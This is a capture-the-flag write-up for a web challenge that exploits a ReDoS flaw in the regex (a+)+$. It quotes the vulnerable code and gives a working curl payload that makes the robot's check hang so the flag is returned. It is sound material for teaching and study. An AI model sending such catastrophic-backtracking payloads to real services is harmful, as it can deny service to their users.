# Fastest Robot Web Challenge

**Challenge Type:** Web Security / ReDoS Attack  
**Difficulty:** Medium  
**Author:** Mutt (UK CyberTeam)  
**Status:** ✅ SOLVED

## Challenge Info

- **URL:** https://cpp.bootupctf.net:8088/
- **Source Code:** `main.py`
- **Flag:** [REDACTED - Submit solution to competition organizers]

## Quick Solution

```bash
curl "https://cpp.bootupctf.net:8088/flag/$(printf 'a%.0s' {1..30})z"
```

## Challenge Description
"Put your web and code auditing skills to the test and exploit the vulnerability to get the flag!"

The challenge presents a race condition where you must access `/flag` before a robot does. The robot gets a 2-second head start.

## Vulnerability

**ReDoS (Regular Expression Denial of Service)** in regex pattern `(a+)+$`

### Source Code Analysis (main.py)
```python
def visit_url_with_regex_check(url):
    # ... path processing ...
    match = re.match("(a+)+$", path)  # VULNERABLE REGEX
```

## Files Structure

```
fastest_robot_web/
├── README.md              # This file
├── main.py               # Challenge source code
└── solution/
    ├── exploit_robot.sh          # Bash exploitation script
    ├── fastest_robot_solution.py # Initial analysis script
    ├── fastest_robot_solved.py   # Final solution documentation
    └── test_redos.py            # Local ReDoS testing
```

## Solution Summary

1. **Analysis:** Found vulnerable regex `(a+)+$` in source code
2. **Vulnerability:** Catastrophic backtracking with nested quantifiers  
3. **Exploit:** Send payload with 30 'a's followed by 'z'
4. **Result:** Bot regex hangs > 2 seconds, gets terminated, flag returned

**Working Exploit:**
```bash
curl "https://cpp.bootupctf.net:8088/flag/$(printf 'a%.0s' {1..30})z"
```

**Server Response:**
```
My robot had a head start... and you still beat him??? Fine, here's the flag: <b>[REDACTED]</b>
```

See `solution/` folder for detailed exploitation scripts and analysis.
